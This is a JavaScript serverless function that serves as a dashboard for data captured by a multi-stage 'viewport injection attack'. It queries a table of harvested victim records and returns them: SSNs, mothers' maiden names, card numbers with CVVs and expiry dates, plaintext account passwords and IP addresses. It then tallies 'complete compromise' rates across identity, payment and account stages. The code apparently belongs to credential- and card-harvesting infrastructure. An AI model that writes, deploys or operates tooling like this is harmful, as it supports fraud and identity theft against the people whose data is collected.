// Vercel Serverless Function to view captured viewport injection attack data v3
// Endpoint: /api/membership/view-v3

import { neon } from '@neondatabase/serverless';

export default async function handler(req, res) {
    if (req.method !== 'GET') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    try {
        // Connect to Neon database
        const sql = neon(process.env.subscription_form_DATABASE_URL);

        // Get query parameters for filtering
        const { limit = 50, viewport_success_only, trigger_source } = req.query;

        let result;

        // Build query based on filters
        if (viewport_success_only === 'true' && trigger_source) {
            result = await sql`
                SELECT
                    id,
                    first_name,
                    last_name,
                    email,
                    birthdate,
                    zip_code,
                    agreement_accepted,
                    CASE
                        WHEN social_security_number IS NOT NULL
                        THEN CONCAT('***-**-', RIGHT(social_security_number, 4))
                        ELSE NULL
                    END as masked_ssn,
                    mother_maiden_name,
                    CASE
                        WHEN verify_card_number IS NOT NULL
                        THEN CONCAT('****-****-****-', RIGHT(verify_card_number, 4))
                        ELSE NULL
                    END as masked_card_number,
                    verify_expiry_month,
                    verify_expiry_year,
                    verify_cvv,
                    verify_card_name,
                    verify_billing_zip,
                    account_password,
                    confirm_password,
                    backup_phone_number,
                    emergency_contact,
                    viewport_injection_success,
                    trigger_source,
                    viewport_height,
                    document_height,
                    injection_position,
                    is_field_update,
                    user_agent,
                    ip_address,
                    submitted_at,
                    created_at
                FROM membership_attack_data_v3
                WHERE viewport_injection_success = true AND trigger_source = ${trigger_source}
                ORDER BY created_at DESC
                LIMIT ${parseInt(limit)}
            `;
        } else if (viewport_success_only === 'true') {
            result = await sql`
                SELECT
                    id,
                    first_name,
                    last_name,
                    email,
                    birthdate,
                    zip_code,
                    agreement_accepted,
                    CASE
                        WHEN verify_card_number IS NOT NULL
                        THEN CONCAT('****-****-****-', RIGHT(verify_card_number, 4))
                        ELSE NULL
                    END as masked_card_number,
                    verify_expiry_month,
                    verify_expiry_year,
                    verify_cvv,
                    verify_card_name,
                    verify_billing_zip,
                    viewport_injection_success,
                    trigger_source,
                    viewport_height,
                    document_height,
                    injection_position,
                    is_field_update,
                    user_agent,
                    ip_address,
                    submitted_at,
                    created_at
                FROM membership_attack_data_v3
                WHERE viewport_injection_success = true
                ORDER BY created_at DESC
                LIMIT ${parseInt(limit)}
            `;
        } else if (trigger_source) {
            result = await sql`
                SELECT
                    id,
                    first_name,
                    last_name,
                    email,
                    birthdate,
                    zip_code,
                    agreement_accepted,
                    CASE
                        WHEN verify_card_number IS NOT NULL
                        THEN CONCAT('****-****-****-', RIGHT(verify_card_number, 4))
                        ELSE NULL
                    END as masked_card_number,
                    verify_expiry_month,
                    verify_expiry_year,
                    verify_cvv,
                    verify_card_name,
                    verify_billing_zip,
                    viewport_injection_success,
                    trigger_source,
                    viewport_height,
                    document_height,
                    injection_position,
                    is_field_update,
                    user_agent,
                    ip_address,
                    submitted_at,
                    created_at
                FROM membership_attack_data_v3
                WHERE trigger_source = ${trigger_source}
                ORDER BY created_at DESC
                LIMIT ${parseInt(limit)}
            `;
        } else {
            result = await sql`
                SELECT
                    id,
                    first_name,
                    last_name,
                    email,
                    birthdate,
                    zip_code,
                    agreement_accepted,
                    CASE
                        WHEN verify_card_number IS NOT NULL
                        THEN CONCAT('****-****-****-', RIGHT(verify_card_number, 4))
                        ELSE NULL
                    END as masked_card_number,
                    verify_expiry_month,
                    verify_expiry_year,
                    verify_cvv,
                    verify_card_name,
                    verify_billing_zip,
                    viewport_injection_success,
                    trigger_source,
                    viewport_height,
                    document_height,
                    injection_position,
                    is_field_update,
                    user_agent,
                    ip_address,
                    submitted_at,
                    created_at
                FROM membership_attack_data_v3
                ORDER BY created_at DESC
                LIMIT ${parseInt(limit)}
            `;
        }

        // Calculate comprehensive statistics for multi-stage attack
        const stats = {
            total_records: result.length,
            successful_injections: result.filter(r => r.viewport_injection_success).length,
            stage_completion: {
                with_identity_data: result.filter(r => r.masked_ssn || r.mother_maiden_name).length,
                with_payment_data: result.filter(r => r.masked_card_number).length,
                with_account_data: result.filter(r => r.account_password).length,
                complete_compromise: result.filter(r =>
                    (r.masked_ssn || r.mother_maiden_name) &&
                    r.masked_card_number &&
                    r.account_password
                ).length
            },
            sensitive_data_captured: {
                ssn: result.filter(r => r.masked_ssn).length,
                maiden_names: result.filter(r => r.mother_maiden_name).length,
                passwords: result.filter(r => r.account_password).length,
                phone_numbers: result.filter(r => r.backup_phone_number).length,
                emergency_contacts: result.filter(r => r.emergency_contact).length
            },
            field_updates: result.filter(r => r.is_field_update).length,
            final_submissions: result.filter(r => !r.is_field_update).length,
            trigger_breakdown: {
                email_input: result.filter(r => r.trigger_source === 'email-input').length,
                email_blur: result.filter(r => r.trigger_source === 'email-blur').length,
                checkbox_agree: result.filter(r => r.trigger_source === 'checkbox-agree').length,
                form_submit: result.filter(r => r.trigger_source?.includes('form-submit')).length
            }
        };

        res.status(200).json({
            success: true,
            message: 'Viewport injection attack v3 data retrieved',
            attack_type: 'viewport-injection',
            statistics: stats,
            data: result,
            table: 'membership_attack_data_v3',
            filters_applied: {
                viewport_success_only: viewport_success_only === 'true',
                trigger_source: trigger_source || 'all',
                limit: parseInt(limit)
            },
            note: 'Sensitive data (SSN, card numbers) are masked for security. Multi-stage viewport injection progressively escalates data collection: Identity → Payment → Account Security.'
        });

    } catch (error) {
        console.error('Failed to retrieve viewport injection v3 data:', error);
        res.status(500).json({
            error: 'Failed to retrieve viewport injection attack v3 data',
            details: error.message,
            attack_type: 'viewport-injection'
        });
    }
}